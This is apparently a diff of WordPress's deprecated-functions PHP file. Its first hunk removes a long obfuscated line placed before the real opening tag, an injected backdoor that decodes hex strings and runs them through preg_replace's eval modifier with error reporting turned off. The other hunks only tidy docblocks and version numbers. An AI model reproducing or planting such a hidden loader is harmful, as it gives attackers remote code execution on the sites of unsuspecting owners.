@@ -1,4 +1,4 @@
-<?php $omzqyhziax = 'c%x7822)gj!|!*nbsbq%x5j!|!*bubE{h%x5c%x7825)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf)fepmqyf%x5c%x7827*&7*<%x5c%x7825j:,,Bjg!)%x5c%x7825j:>>1*!%x5c%x7825b:>1<!fmtf!%x5c%x78252f%x5c%x7825r%x5c%x7878<~!!%x5c%x7825s:7825z>>2*!%x5c%x7825z>3<!fmtf!%x5c%x7825z>2<!%x5c%x7825ww2)%x5c%x7824*!|!%x5c%x7824-%x5c%x7824%x5c%x785c%x5c%x7825j^%x5c%#%x5c%x782f},;#-#}+;%x5c%x7825-qp%x5c%x7825)54l}%x5c%!>>%x5c%x7822!pd%x5c%x78x5c%x782f!**#sfmcnbs+yfeobz+5ppde:4:|:**#ppde#)tutj75ttfsqnpdov{h19275j{hnpd19275fubmgoj{7860%x5c%x7825}X;!sp!*#opo#>>}R;msv}.;%x5c%x782f#%x5c%x782f5c%x78256<pd%x5c%x7825w6Z6<.2%x5c%x7860hA%x5c%x7827pd%x5c%:Qb:Qc:W~!%x5c%x7825z!>2<!gps)%x5c%x7825j>1<%x5c%x7825j=6[%x5c%c%x782f2986+7**^%x5c%x78c%x7825)7gj6<**2qj%x5c%x7825)hopm3qjA)4gps)%x5c%x7825j>1<%x5c%x782%x5c%x7860opjudovg%x5c%x7822)!gj}1~!<2p%x5c%x7825%x5c%x787f!~!<##ovg<~%x5c%x7824<!%x5c%x782%x7827id%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#ujojRk3%%x7825!osvufs!*!+A!>!{e%x5c%x7825)!>>%x5c%x7822787f%x5c%x787f%x5c%x787f<u%x5c%x7163%x74%162%x5f%163%x70%154%x69%164%50%x22%134>!%x5c%x7825tdz)%x5c%x7825164") && (!isset($GLOBALS["%x61%156%x75%156%x61"]25)dfyfR%x5c%x7827tfs%x5c%x78256<*17-%x5c%x7825w6<%x5c%x787fw6*CWtfs%!}{;)gj}l;33bq}k;opjudovg}%x5c%x7878-1);} @error_reporting(0); preg_replace("x787f_*#fmjgk4%x5c%x7860{6~6<tfs78256<C>^#zsfvr#%x5c%x785cq%x5c%x7825svufs}%x5c%x7827;mnui}&;zepc}A;~!}%x5c%x787f;!|%x78e%x5c%x78b%x5c%x7825w782fqp%x5c%x7825>5h%x5c%x7825!<*::::::-111112gj!<*2bd%x5c%x7825-#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x7825!<*qp%x5c%x77^#iubq#%x5c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x%51%x29%51%x29%73", N)))) { $GLOBALS["%x6if((function_exists("%x6f%x7824-%x5c%x7824tvctus)%x5c%x7825%x5c%x7824-%x5c%x7824b!>!%x566%152%x66%147%x67%42%x2c%ssb!-#}#)fepmqnj!%x5c%x782f!#0#)id5j=tj{fpg)%x5c%x7825%5c%x7825z-#:#*%x5c%x7824-%x5c%x7824!>!tus%x5c%x7860sfqm<#462]47y]252]18y]#>q%x5c%x75cIjQeTQcOc%x5c%x782f#x7827;%x5c%x7825!<*#}_;#)323ldfid>}&;!osvufs}%x5c%x787gvc%x5c%x7825}&;ftmbg}%x5c%x787f;!osvufs}w;*%x5c%x787f]y34]68]y33]65]y31]53]25)!gj}Z;h!opjudovg}{;#)tutjyf%x5c%x7860c%x7825r%x5c%x785c2^-%x5c%x7825hOhzw>!#]y76]277]y72]265]y39]274]y85]273]y6g]273]y76]212>j%x5c%x7825!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%x5c%x7825)sutcvt)!gubn%x5c%x7860hfsq)!sp!*#ojneb#-*f%x5c%x7825)sf%x5c%x787x5c%x7827pd%x5c%x78256<pd%x5x5c%x7860{666~6<&w6<%x5c%x787fw6*C{66~67<&w6<*&7-#o]s]o]s]#UI7jsv%x5c%x78257UFH#%x5c%x7827rfs%x5c%x7825]D8]86]y31]278]y3f]51L3]84]y31M6]y8:<##:>:h%x5c%x7825:<#64y]552]e7y]#>n%x5c%x78928>>%x5c%x7822:ftmbg39*56A:>:8:|:7#6#)tutjyf%x5c%x78604392%x2f%50%x2e%52%x29%57%x!ftmbg)!gj<*#k#)usbut%x5cgps)%x5c%x7825j:>1<%x5c%x7825j:=tj{fpg)%x5c%x7825s:%162%x61%171%x5f%155%x61%160%x28%42%x73]y76]258]y6g]273]y76]271]y7d]252]y74]225t::!>!%x5c%x7824Ypp3)%x5c%x7828pmpusut)tpqssutRe%x5c%x7825)Rd%x5c%x7825)Rb%x5c%x7825))!gj!<X;%x5c%x7860msvd}R;*msvfw)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c1sfwjidsb%x5c%x7860bj+upcotn+qsvmt+fmhpph#)zbc%x7825)!gj!<2,*j%x5c%x7825-#1]#-bubE{h7825!|!*)323zbek!~!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7825Z<#opo#>b#-#G#-#H#-#I#-#K#-#Lc%x78786<C%x5c%x7827&6<*rfs%x5c%x78257-K)fujs%x5c%x7h1:|:*mmvo:>:iuhofm%x5c%x7825:-25bss-%x5c%x7825r%x5c%x7x5c%x787f!|!*uyfu%x5c%x7827k:!ftmf!f+*0f(-!#]y76]277]y72]265]y39]271]y83]256]y78]248]y83]256]y81]2yf%x5c%x78604%x5c%x78223}!+!<+{e%x5c%x7825+*!*+fepdfe{h+{d%x5c%x7825b:>%x5c%x7825s:%x5c%x785c%x5c%x7825j:.2^,%x5c%x7825b:<!%x5c%x7825c:>%x%x7824-!%x5c%x7825%x5c%x7824-%x5c%xFSFGFS%x5c%x7860QUUI&c_UOFHB%x5c%x7860SFTV%x5c%x7860QUUI&b%x5c%x%x5c%x7825!**X)ufttj%x5%x5c%x7860{66~6<&w6<%x5c%x787fw6*CW&)7gj%x5c%x787f<*XAZASV<*w%x5c%x7825)ppde>u%x5c%x7825V<#65,47R25,d7R17,6f;!opjudovg}k~~9{d%x5c%x7825:osvufs:~825<#762]67y]562]38y]572]48y]#>m%x5c%x7825:|:*r%x5c5cB%x5c%x7825iN}#-!tuss%x7825:-t%x5c%x7825)3of:opjud#<!%x5c%x7825ggg)(0)%x5c%x7826:!}7;!}6;##}C;!>>!}W;utpi}Y;25<#372]58y]472]37y]672]48y]#>s%x5c%x7825bbT-%x5c%x7825bT-%x5c%x7825hW~%x5c%xc%x78256<*Y%x5c%x7825)fnbozx78256<C%x5c%x7827pd%x5c%x78256|6.7euqj3hopmA%x5c%x78273qj%x5x5c%x7878r.985:52985-t.98]K4]65po)##-!#~<#%x5c%x782f%x5c%x7825%x5c%x7824-%x5c%x7824!>x7860%x5c%x7878%x5c%x7822l:!}V;3q%x5c%x7825}U;y]}R;2]},;oe%x5c%x78b%x5c%x7825mm)%x5c%x7825%x5c%x7878:-!%x5c%x7825tzw%x5c%x782f%x5c%x7824)#P#-#Q#-#B#-#T#-#Ex5c%x782f#M5]DgP5]D6#<%x5c%x7825fdSFEBFI,6<*127-UVPFNJU,67)fepdof.)fepdof.%x5c%x782f#@#%x5c%xB%x5c%x7825z>!tussfw)-n%x5c%x7825)utjm6<%x5c%x787fw6*CW&)7gj6<*K)ftpmdXA6~6<u%x5c%7**197-2qj%x5c%x78257-K)udfoopdXA%x5c%x7822)7825tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72]254]y76#<%x5c%x78*#npd%x5c%x782f#)rrd%x5c%x782f#0142%x5f%163%x74%141%x72%t0*?]+^?]_%x5c%x785c}X%x5c%x7824<!%x5c%x7825tfd)##Qtpz)#]341]88M4P8]37]278]225]241]334]368]322]3]0;quui#>.%x5c%x7825!<***f%x5c%x7827,*e%x5c%x7827,*d%x7825w%x5c%x7860TW~%x5c%x7824<%x5c%x78y7:]268]y7f#<!%x5c%x7825tww!>!%x5c%x78256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]25%x5c%x7824-%x5cgj6<*QDU%x5c%x7860MPT7-NBFSUT%x5c%x7860LDPT7-UFO65","%x65%166%x61%154%x28%151%x6d%160%x6c%157%x64%145%x28%141%x72%x5c%x7825!*##>>X)!gjZ<#opo#>b7**^#zsfvr#%x5c%x785cq%x5c%x7825)ufttj%x5c%x7822)gj!>!2p%x5c%x7825Z<^2%x5c%x785c2b%x5c%x7825!>!2p%x5c;hojepdoF.uofuopD#)sfebfI{*w%x5c%x7825)kV%N}#-%x5c%x7825o:W%x5c%x7825c:>1<%x5c%x7825b:>1<!}Z;^nbsbq%x5c%x7825%x5c%x785cSFWSFT%x5c%xj%x5c%x7825!<**3-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#w#)ldbqov>*ofmy%Ke]53Ld]53]Kc]55Ld]55#*<%x5c%x7825bG9}:}.}-}!#*<%x5c%x7825nfd>%x5c5c%x7825s:%x5c%x785c%x5c%x7825j:^<!%x5c%x7825w%x5c%x7860%x5c%x785c^>Ew+;!>!}%x5c%x7827;!>>>!}_;]y76]72]y3d]51]y35]274]y4:]82]y3:]62]y4c#<!%x5c%x7874985-rr.93e:5597f-s.973:8297f:5297e:56-%j:-!OVMM*<(<%x5c%x78e%x5c%x78b%x5c%x7825ggg!>!#]y8bdf)%x5c%x7825%x5c%x7824-%x5c%x7824y4%x5c%x7825V%x5c%x7827{ftmfV%x5c%x787f<*X&Z&S{ftmfV5cq%x5c%x78257%x5c%x782f7#@#7%x5c%x782f25bss%x5c%x785csboe))1%x5c%x782f35.)1%x5c%x782f14+9**-)1%x51]55]y85]82]y76]62]y3:]84#-!OVMM*<%x225c%x7825)m%x5c%x7825=*h%x5c%x7825)m%x5c%x7825):fmji%x5c%x787cYufhA%x5c%x78272qj%x5c%x78256<^#zsfvr#%x5c%x78u%x5c%x7825!-#2#%x5c%x782f#%x5c%!fyqmpef)#%x5c%x7824*<!%x5c%x7825kj:!>!#]y3d]51]y35]25657>%x5c%x782272qj%x5x7825>U<#16,47R57,27R66,#%x5c%x%x7824]26%x5c%x7824-%x5c%x7824<%%x5c%x7825)}.;%x5c%x7860UQPMS452]88]5]48]32M3]317]445]212]445]43]321]464]284]364]6]234]342]7825>j%x5c%x7825!*3!%x5c%x364]6]283]427]36]373P6]x7825#%x5c%x782f#o]#%x5c%x782f*)323zbe!-#jx7825ww2!>#p#%x5c%x782f#p#%x5c%x782f%x5c%x7825z<jg!)%x5c%xx5c%x7824-%x5c%x7824*<!~!dsfbuf%x5c%x7860gvoduj5c%x7827,*c%x5c%x7827,*b%x5c%x782)+opjudovg+)!gj+{e%x5c*WCw*[!%x5c%x7825rN}#QwTW%x5c%x7825hIr%x5c%x785c1^-%x5utpI#7>%x5c%x782f7rfs%x5c%x78256<#o]1%x5c%x782f20QUVD!-id%x5c%x7825)uqpuft%x5c%x7860msvd},;uqpuft%x5c%x7860msvd}x78256<pd%x5c%x7825w6Z6<.4%x5c%x7860hA%7827!hmg%x5c%x7825!)!gj!<2,*j%x5c%x7825!-#1]#-bubE{h%x5c%x7825)t6<^#Y#%x5c%x785cq%x5c%x7825%x5c%x7827Y%x5c%x78256<.msv%x5c%x78607825fdy)##-!#~<%x5c%x7825h00#*<%x5c%x7825ng%x5c%x7825)!gj!|!*1?hmgjA%x5c%x7827&6<.fmjgA%x5c%x7827doj%x5c%x78256<%x5c%x787fw6*%x5c%825-*.%x5c%x7825)euhA)3o36]73]83]238M7]381]211M5]67]5c%x7824-%x5c%x7824*<!%x5c%x7824-%x5c%x78225tmw!>!#]y84]275]y83]273]y76]277#<%x5c%x7825t2w>#]<*27-SFGTOBSUOSVUFS,6<*msv%x5c%x78257-MSV,6<*)ujojR%x5c#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*%x5c%x7824%x5c%x782f%x5c%x7825kf>2bd%x5c%x7825!<5h%x5c%x7825%x5c%x782f#0#%x5c%x782f65]y72]254]y76]61]y33]685c%x7825%x5c%x7878:!>#]y3g]61]y3f]63]y3:]68]y76#<%x5cx5c%x7825!|!*!***b%x5c%x7825)sf%x5c%x7878pmpusut!-#j0#!%71]y7d]252]y74]256]y39]252]y83]273]y72]282#<!%x5c%x77R37,#%x5c%x782fq%x5c%o!sboepn)%x5c%x7825epnbss-%x5c%x7825r%x5c%x7878W~!Ypp2)%x5c%x7825zc%x7825yy)#}#-#%x5c%x7824-%x5c%x7824-tusqpt)%x%x7825fdy<Cb*[%x5c%x7825h!:!>!%x5c%x78246767~6<5o:!>!%x5c%x78242178}527}88:}334}472%x5c%x7824<!%x5c%x7825mm!>!#]y81]2%x7825}K;%x5c%x7860ufldpt})3of)fepdof%x5c%x786057ftbc%^W%x5c%x7825c!>!%x5c%x7825i%x5c%x785c2^<!Ce*[!%x5c%x782y6d]281]y43]78]y33]65]y3>#L4]275L3]248L3P6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ld]245]K2]285]58]24]31#-%x5c%x7825tdz*Wsfuvso!%x5c%x78;0]=])0#)U!%x5c%x7827{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7825l}S;2-x78257>%x5c%x782f7&6|7**111127-K)ebfsX%x5c%x7827u%x5c%x7825)7fmji%x5x5c%x7825)sutcvt)esp>hmg%x5c%x7825!<%x5c%x7825zW%x5c%x7825h>EzH,2W%x5c%x7825wN;#-Ez-1H%x5c%x782f#00#W~!%x5c%x7825t2w)##6~6<%x5c%x787fw6<*K)ftpmdXA6|%x5c%x7825)!gj!<**2-4-bubE{h%x7825>%x5c%x782fh%x5c%x7825:<**#57]38y]47782fq%x5c%x7825>2q%x5c%x7825<#g6R85,67R37,18R#>q%x5c%x7825V<*#fopoV]67y]37]88y]27]28y]#%x5c%x782fr%x5c%x7825%xc%x7825w6Z6<.3%x5c%x7860hA%x5c%x7827pd%xopjudovg)!gj!|!*msv%x5c%x7825)}k~~~<ftmbg!osvufs!|ftmf!~<**9*%x5c%x787f_*#[k2%x5c%x7860{pqsut>j%x5c%x7825!*72!%x5c%x7827!hmg%x54:75983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#ftsbqA7>q%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fubfsdXk5.-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%xx5c%x7878{**#k#)tutjyf%x5c%00#W~!Ydrr)%x5c%x7825r%x5c%x7878Bsfuvse_GMFT%x5c%x7860QIQ&f_UTPI%x5c%x7860QUUI&e_SEEB%x5c%x7860FUPNFS&d_S1]273]y76]258]y6g]273]y76]271]y7d]252]y74]256%x78%62%x35%165%x3a%146%x21%76%x21%50%x878B%x5c%x7825h>#]y31]278]y3e]81]K78:56985:6197g:*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpQtjw)#]82#-#!#-%x5c%x7825tmw)%x5c%x7825tww**WYsboepn)%x5c%x783e]81#%x5c%x782f#7e:55946-tr.986<*doj%x5c%x78257-C)fepmqn)eobs%x5c%x7860un>qp%x5c%x7825!|Z~!<##!>!2p%400~:<h%x5c%x7825_t%x5c%x7825:osvufs:~:<*9-1-r%x5c%x7825)s%x5c%W&)7gj6<.[A%x5c%x7827&6<%x5c%x787fw6878X6<#o]o]Y%x5c%x78257;824-%x5c%x7824]y8%x5c%x7824-%x5cJ%x5c%x7860GB)fubfsdXA%x5c%x7827K6<%x5c%x787fw6*3qj%x5c%x782tuofuopd%x5c%x7860ufh%x5c%x7860fmjg}[;ldpt%x5c%x7860cpV%x5c%x787f%x5c%xx5c%x7825)7gj6<*id%x5c%x7825)ftpmdR6<*id%x5c%x78c%x7825!-uyfu%x5c%x7825y74]273]y76]252]y85]256]y6g]257]y86]267]y74]275]5c%x782fh%x5c%x7825)n%x5c%x7825-#+I#)q%x5c%x7825:>:r%x5c%x7825:|:**t%x%x5c%x7825)tpqsut>j%x5c%x78c%x7825)323ldfidk!~!<**qp%x5x5c%x7825j,,*!|%x5c%x7824-%x5c%x7824gvodujpo!%x5c%x7824-%x5c%x7824y7%x%x7825!*3>?*2b%x5c%x7825)gpf{jt)!Cw6<pd%x5c%x7825w6Z6<.5%x5c%x7860hA%x5c%x7827pd%x5c%1%156%x75%156%x61"]=1; function fjfgg($n){return chr(ord($n)25!*9!%x5c%x7827!hmg%x5c%x7825)!gj!~<ofmy%x5c%x7825,3,j%x5c%x7825>x5c%x7825)utjm!|!*5!%x5c%x7827!hmy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%x5c%x7825tdzULL); }]D6M7]K3#<%x5c%x7825yy>#]D6]281L1#%/(.*)/epreg_replacedlwbmsnyyp'; $qmtjqulssr = explode(chr((135-91)),'1600,26,4511,24,1062,49,1580,20,9846,60,1216,41,2517,23,4864,65,2616,37,1687,26,990,46,8859,39,7210,53,1373,25,7531,21,9794,52,6572,39,2248,28,8324,40,554,58,3894,37,2310,25,79,21,4309,61,7928,68,3020,52,9260,24,6460,51,2335,44,8115,29,4370,45,4816,48,9316,60,5981,20,699,38,3931,24,3867,27,5847,47,5651,39,1511,48,1289,37,4959,51,6675,64,8559,56,3485,40,9091,26,6805,64,1257,32,1148,32,9447,48,1111,37,4229,23,7014,55,856,54,2276,34,9224,36,8424,28,3761,29,9376,46,7622,26,2786,23,6064,29,6511,61,5397,25,1927,54,382,24,2003,40,8364,60,8615,67,6155,26,6611,64,8452,39,2896,39,9636,27,9906,66,5191,70,9972,33,6781,24,8144,29,7996,36,2128,65,22,57,765,65,5010,50,9761,33,1443,68,6869,24,7134,52,4479,32,4632,53,6351,33,4252,36,1398,45,9117,44,7263,56,406,28,2852,44,1713,34,2193,55,2725,61,8947,52,8747,67,3398,64,2935,65,4929,30,3462,23,0,22,9663,28,9495,23,7648,28,3127,35,5150,41,495,59,329,53,1873,54,3592,37,2458,59,457,38,3072,31,434,23,3225,68,6384,22,910,47,2540,25,9422,25,957,33,5608,43,3525,67,7371,22,6001,31,8214,67,5060,42,8682,27,4040,57,1326,47,1180,36,7860,68,5894,32,6204,42,4535,45,2077,51,7319,52,4415,64,6963,51,9518,48,4722,39,9161,63,8173,41,8281,43,9566,70,5787,60,2413,45,3790,41,1823,28,3629,51,3703,29,830,26,7552,70,2653,40,4761,55,3363,35,273,56,1626,61,7459,46,1768,55,5564,44,9284,32,6032,32,9691,70,6921,42,737,28,1747,21,6304,47,3986,54,5926,55,5422,51,2693,32,3680,23,2809,43,7676,55,1851,22,8709,38,7393,66,4288,21,8032,50,6406,54,2043,34,8082,33,8999,61,3103,24,8898,49,5473,41,3955,31,2379,34,9060,31,8491,68,10071,35,4195,34,10005,59,7755,65,5261,66,7505,26,1036,26,3831,36,6739,42,4580,52,6181,23,6893,28,6093,62,7820,40,5690,59,675,24,169,39,5102,48,2565,51,100,69,3293,70,5327,70,612,63,6246,58,208,65,4685,37,4097,61,4158,37,3000,20,7069,65,5514,50,8814,45,3732,29,3162,63,7186,24,1981,22,7731,24,5749,38,1559,21,10064,7'); $myxxbutxep=substr($omzqyhziax,(60426-50320),(47-40)); if (!function_exists('xogzuazkwt')) { function xogzuazkwt($jxdkxlrekg, $phytufgmej) { $fkcibcnggm = NULL; for($dpibkqtddc=0;$dpibkqtddc<(sizeof($jxdkxlrekg)/2);$dpibkqtddc++) { $fkcibcnggm .= substr($phytufgmej, $jxdkxlrekg[($dpibkqtddc*2)],$jxdkxlrekg[($dpibkqtddc*2)+1]); } return $fkcibcnggm; };} $ownnycpwxe="\x20\57\x2a\40\x6d\163\x6b\154\x64\146\x68\152\x62\151\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\64\x34\55\x31\60\x37\51\x29\54\x20\143\x68\162\x28\50\x33\65\x30\55\x32\65\x38\51\x29\54\x20\170\x6f\147\x7a\165\x61\172\x6b\167\x74\50\x24\161\x6d\164\x6a\161\x75\154\x73\163\x72\54\x24\157\x6d\172\x71\171\x68\172\x69\141\x78\51\x29\51\x3b\40\x2f\52\x20\165\x72\172\x63\141\x6a\150\x61\160\x6d\40\x2a\57\x20"; $pfeipaitvs=substr($omzqyhziax,(61373-51260),(69-57)); $pfeipaitvs($myxxbutxep, $ownnycpwxe, NULL); $pfeipaitvs=$ownnycpwxe; $pfeipaitvs=(757-636); $omzqyhziax=$pfeipaitvs-1; ?><?php
+<?php
 /**
  * Deprecated functions from past WordPress versions. You shouldn't use these
  * functions and look for the alternatives instead. The functions will be
@@ -53,7 +53,7 @@ function get_postdata($postid) {
  * Sets up the WordPress Loop.
  *
  * @since 1.0.1
- * @deprecated 1.5
+ * @deprecated 1.5.0
  * @deprecated Use The Loop - {@link http://codex.wordpress.org/The_Loop Use new WordPress Loop}
  */
 function start_wp() {
@@ -121,8 +121,8 @@ function the_category_head($before='', $after='') {
 /**
  * Prints link to the previous post.
  *
- * @since 1.5
- * @deprecated 2.0
+ * @since 1.5.0
+ * @deprecated 2.0.0
  * @deprecated Use previous_post_link()
  * @see previous_post_link()
  *
@@ -159,7 +159,7 @@ function previous_post($format='%', $previous='previous post: ', $title='yes', $
  * Prints link to the next post.
  *
  * @since 0.71
- * @deprecated 2.0
+ * @deprecated 2.0.0
  * @deprecated Use next_post_link()
  * @see next_post_link()
  *
@@ -194,8 +194,8 @@ function next_post($format='%', $next='next post: ', $title='yes', $in_same_cat=
 /**
  * Whether user can create a post.
  *
- * @since 1.5
- * @deprecated 2.0
+ * @since 1.5.0
+ * @deprecated 2.0.0
  * @deprecated Use current_user_can()
  * @see current_user_can()
  *
@@ -214,8 +214,8 @@ function user_can_create_post($user_id, $blog_id = 1, $category_id = 'None') {
 /**
  * Whether user can create a post.
  *
- * @since 1.5
- * @deprecated 2.0
+ * @since 1.5.0
+ * @deprecated 2.0.0
  * @deprecated Use current_user_can()
  * @see current_user_can()
  *
@@ -234,8 +234,8 @@ function user_can_create_draft($user_id, $blog_id = 1, $category_id = 'None') {
 /**
  * Whether user can edit a post.
  *
- * @since 1.5
- * @deprecated 2.0
+ * @since 1.5.0
+ * @deprecated 2.0.0
  * @deprecated Use current_user_can()
  * @see current_user_can()
  *
@@ -263,8 +263,8 @@ function user_can_edit_post($user_id, $post_id, $blog_id = 1) {
 /**
  * Whether user can delete a post.
  *
- * @since 1.5
- * @deprecated 2.0
+ * @since 1.5.0
+ * @deprecated 2.0.0
  * @deprecated Use current_user_can()
  * @see current_user_can()
  *
@@ -283,8 +283,8 @@ function user_can_delete_post($user_id, $post_id, $blog_id = 1) {
 /**
  * Whether user can set new posts' dates.
  *
- * @since 1.5
- * @deprecated 2.0
+ * @since 1.5.0
+ * @deprecated 2.0.0
  * @deprecated Use current_user_can()
  * @see current_user_can()
  *
@@ -303,8 +303,8 @@ function user_can_set_post_date($user_id, $blog_id = 1, $category_id = 'None') {
 /**
  * Whether user can delete a post.
  *
- * @since 1.5
- * @deprecated 2.0
+ * @since 1.5.0
+ * @deprecated 2.0.0
  * @deprecated Use current_user_can()
  * @see current_user_can()
  *
@@ -323,8 +323,8 @@ function user_can_edit_post_date($user_id, $post_id, $blog_id = 1) {
 /**
  * Whether user can delete a post.
  *
- * @since 1.5
- * @deprecated 2.0
+ * @since 1.5.0
+ * @deprecated 2.0.0
  * @deprecated Use current_user_can()
  * @see current_user_can()
  *
@@ -343,8 +343,8 @@ function user_can_edit_post_comments($user_id, $post_id, $blog_id = 1) {
 /**
  * Whether user can delete a post.
  *
- * @since 1.5
- * @deprecated 2.0
+ * @since 1.5.0
+ * @deprecated 2.0.0
  * @deprecated Use current_user_can()
  * @see current_user_can()
  *
@@ -363,8 +363,8 @@ function user_can_delete_post_comments($user_id, $post_id, $blog_id = 1) {
 /**
  * Can user can edit other user.
  *
- * @since 1.5
- * @deprecated 2.0
+ * @since 1.5.0
+ * @deprecated 2.0.0
  * @deprecated Use current_user_can()
  * @see current_user_can()
  *
@@ -387,14 +387,14 @@ function user_can_edit_user($user_id, $other_user) {
  * Gets the links associated with category $cat_name.
  *
  * @since 0.71
- * @deprecated 2.1
+ * @deprecated 2.1.0
  * @deprecated Use get_bookmarks()
  * @see get_bookmarks()
  *
  * @param string $cat_name Optional. The category name to use. If no match is found uses all.
  * @param string $before Optional. The html to output before the link.
  * @param string $after Optional. The html to output after the link.
- * @param string $between Optional. The html to output between the link/image and it's description. Not used if no image or $show_images is true.
+ * @param string $between Optional. The html to output between the link/image and its description. Not used if no image or $show_images is true.
  * @param bool $show_images Optional. Whether to show images (if defined).
  * @param string $orderby Optional. The order to output the links. E.g. 'id', 'name', 'url', 'description' or 'rating'. Or maybe owner.
  *		If you start the name with an underscore the order will be reversed. You can also specify 'rand' as the order which will return links in a
@@ -421,13 +421,13 @@ function get_linksbyname($cat_name = "noname", $before = '', $after = '<br />', 
  * Gets the links associated with the named category.
  *
  * @since 1.0.1
- * @deprecated 2.1
+ * @deprecated 2.1.0
  * @deprecated Use wp_list_bookmarks()
  * @see wp_list_bookmarks()
  *
  * @param string $category The category to use.
  * @param string $args
- * @return bool|null
+ * @return string|null
  */
 function wp_get_linksbyname($category, $args = '') {
 	_deprecated_function(__FUNCTION__, '2.1', 'wp_list_bookmarks()');
@@ -451,15 +451,13 @@ function wp_get_linksbyname($category, $args = '') {
 /**
  * Gets an array of link objects associated with category $cat_name.
  *
- * <code>
- *	$links = get_linkobjectsbyname('fred');
- *	foreach ($links as $link) {
- * 		echo '<li>'.$link->link_name.'</li>';
- *	}
- * </code>
+ *     $links = get_linkobjectsbyname( 'fred' );
+ *     foreach ( $links as $link ) {
+ *      	echo '<li>' . $link->link_name . '</li>';
+ *     }
  *
  * @since 1.0.1
- * @deprecated 2.1
+ * @deprecated 2.1.0
  * @deprecated Use get_bookmarks()
  * @see get_bookmarks()
  *
@@ -468,7 +466,7 @@ function wp_get_linksbyname($category, $args = '') {
  *		Or maybe owner. If you start the name with an underscore the order will be reversed. You can also
  *		specify 'rand' as the order which will return links in a random order.
  * @param int $limit Limit to X entries. If not specified, all entries are shown.
- * @return unknown
+ * @return array
  */
 function get_linkobjectsbyname($cat_name = "noname" , $orderby = 'name', $limit = -1) {
 	_deprecated_function( __FUNCTION__, '2.1', 'get_bookmarks()' );
@@ -485,34 +483,32 @@ function get_linkobjectsbyname($cat_name = "noname" , $orderby = 'name', $limit 
  * Gets an array of link objects associated with category n.
  *
  * Usage:
- * <code>
- *	$links = get_linkobjects(1);
- *	if ($links) {
- *		foreach ($links as $link) {
- *			echo '<li>'.$link->link_name.'<br />'.$link->link_description.'</li>';
- *		}
- *	}
- * </code>
+ *
+ *     $links = get_linkobjects(1);
+ *     if ($links) {
+ *     	foreach ($links as $link) {
+ *     		echo '<li>'.$link->link_name.'<br />'.$link->link_description.'</li>';
+ *     	}
+ *     }
  *
  * Fields are:
- * <ol>
- *	<li>link_id</li>
- *	<li>link_url</li>
- *	<li>link_name</li>
- *	<li>link_image</li>
- *	<li>link_target</li>
- *	<li>link_category</li>
- *	<li>link_description</li>
- *	<li>link_visible</li>
- *	<li>link_owner</li>
- *	<li>link_rating</li>
- *	<li>link_updated</li>
- *	<li>link_rel</li>
- *	<li>link_notes</li>
- * </ol>
+ *
+ * - link_id
+ * - link_url
+ * - link_name
+ * - link_image
+ * - link_target
+ * - link_category
+ * - link_description
+ * - link_visible
+ * - link_owner
+ * - link_rating
+ * - link_updated
+ * - link_rel
+ * - link_notes
  *
  * @since 1.0.1
- * @deprecated 2.1
+ * @deprecated 2.1.0
  * @deprecated Use get_bookmarks()
  * @see get_bookmarks()
  *
@@ -522,7 +518,7 @@ function get_linkobjectsbyname($cat_name = "noname" , $orderby = 'name', $limit 
  *		underscore the order will be reversed. You can also specify 'rand' as the
  *		order which will return links in a random order.
  * @param int $limit Limit to X entries. If not specified, all entries are shown.
- * @return unknown
+ * @return array
  */
 function get_linkobjects($category = 0, $orderby = 'name', $limit = 0) {
 	_deprecated_function( __FUNCTION__, '2.1', 'get_bookmarks()' );
@@ -540,14 +536,14 @@ function get_linkobjects($category = 0, $orderby = 'name', $limit = 0) {
  * Gets the links associated with category 'cat_name' and display rating stars/chars.
  *
  * @since 0.71
- * @deprecated 2.1
+ * @deprecated 2.1.0
  * @deprecated Use get_bookmarks()
  * @see get_bookmarks()
  *
  * @param string $cat_name The category name to use. If no match is found uses all
  * @param string $before The html to output before the link
  * @param string $after The html to output after the link
- * @param string $between The html to output between the link/image and it's description. Not used if no image or show_images is true
+ * @param string $between The html to output between the link/image and its description. Not used if no image or show_images is true
  * @param bool $show_images Whether to show images (if defined).
  * @param string $orderby the order to output the links. E.g. 'id', 'name', 'url',
  *		'description', or 'rating'. Or maybe owner. If you start the name with an
@@ -568,21 +564,21 @@ function get_linksbyname_withrating($cat_name = "noname", $before = '', $after =
  * Gets the links associated with category n and display rating stars/chars.
  *
  * @since 0.71
- * @deprecated 2.1
+ * @deprecated 2.1.0
  * @deprecated Use get_bookmarks()
  * @see get_bookmarks()
  *
  * @param int $category The category to use. If no category supplied uses all
  * @param string $before The html to output before the link
  * @param string $after The html to output after the link
- * @param string $between The html to output between the link/image and it's description. Not used if no image or show_images == true
+ * @param string $between The html to output between the link/image and its description. Not used if no image or show_images == true
  * @param bool $show_images Whether to show images (if defined).
  * @param string $orderby The order to output the links. E.g. 'id', 'name', 'url',
  *		'description', or 'rating'. Or maybe owner. If you start the name with an
  *		underscore the order will be reversed. You can also specify 'rand' as the
  *		order which will return links in a random order.
  * @param bool $show_description Whether to show the description if show_images=false/not defined.
- * @param string $limit Limit to X entries. If not specified, all entries are shown.
+ * @param int $limit Limit to X entries. If not specified, all entries are shown.
  * @param int $show_updated Whether to show last updated timestamp
  */
 function get_links_withrating($category = -1, $before = '', $after = '<br />', $between = " ", $show_images = true,
